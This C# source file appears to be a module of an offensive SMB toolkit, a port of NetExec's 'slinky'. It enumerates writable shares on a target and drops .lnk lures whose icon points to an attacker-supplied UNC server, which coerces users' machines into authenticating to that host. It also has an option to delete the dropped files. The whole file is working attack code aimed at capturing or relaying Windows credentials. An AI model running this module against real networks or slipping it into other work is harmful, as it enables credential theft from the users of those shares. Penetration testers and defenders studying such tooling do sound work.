using Titanis;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec slinky: drops .lnk files with attacker icon UNC on writable shares.
/// Options: NAME=<name> (required), SERVER=<attacker> (required), SHARES=..., IGNORE=..., CLEANUP=True.
/// </summary>
public sealed class SmbSlinkyModule : AtlasModule<Smb2Client>
{
	public override string Name => "slinky";
	public override string Description => "Drops .lnk coercion lures with attacker icon (NAME=..., SERVER=..., SHARES=..., CLEANUP=True)";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		string name = ctx.Option("NAME", "");
		string server = ctx.Option("SERVER", "");
		if (string.IsNullOrWhiteSpace(name) || string.IsNullOrWhiteSpace(server))
		{
			AtlasConsole.Fail($"{ctx.Host}:445", "(slinky) NAME and SERVER are required (e.g. -mo NAME=Docs,SERVER=10.0.0.5)");
			return;
		}
		bool cleanup = ctx.Option("CLEANUP", "").Equals("True", StringComparison.OrdinalIgnoreCase);
		string onlyShares = ctx.Option("SHARES", "");
		var only = new HashSet<string>(onlyShares.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries), StringComparer.OrdinalIgnoreCase);
		var ignore = new HashSet<string>(ctx.Option("IGNORE", "C$,ADMIN$,NETLOGON,SYSVOL").Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries), StringComparer.OrdinalIgnoreCase);
		string fileName = $"{name}.lnk";
		try
		{
			byte[] content = SmbDropHelper.BuildLnk($"\\\\{server}\\share\\{name}.ico");
			var shares = await SmbDropHelper.WritableSharesAsync(ctx, ignore, cancellationToken).ConfigureAwait(false);
			if (only.Count > 0) shares = shares.Where(s => only.Contains(s)).ToList();
			foreach (var share in shares)
			{
				cancellationToken.ThrowIfCancellationRequested();
				try
				{
					if (cleanup)
					{
						try { await ctx.Client.DeleteFileAsync(new Titanis.UncPath(ctx.Host, share, fileName), cancellationToken).ConfigureAwait(false); AtlasConsole.Success($"{ctx.Host}:445", $"(slinky) cleaned \\\\{ctx.Host}\\{share}\\{fileName}"); }
						catch { AtlasConsole.Info($"{ctx.Host}:445", $"(slinky) nothing to clean on {share}"); }
					}
					else
					{
						await SmbDropHelper.PutAsync(ctx, share, fileName, content, cancellationToken).ConfigureAwait(false);
						AtlasConsole.Success($"{ctx.Host}:445", $"(slinky) dropped \\\\{ctx.Host}\\{share}\\{fileName} (icon \\\\{server}\\share\\{name}.ico)");
					}
				}
				catch (Exception ex) { AtlasConsole.Warn($"{ctx.Host}:445", $"(slinky) {share}: {ex.Message}"); }
			}
			if (shares.Count == 0) AtlasConsole.Info($"{ctx.Host}:445", "(slinky) no writable shares found");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(slinky) Failed: {ex.Message}");
		}
	}
}
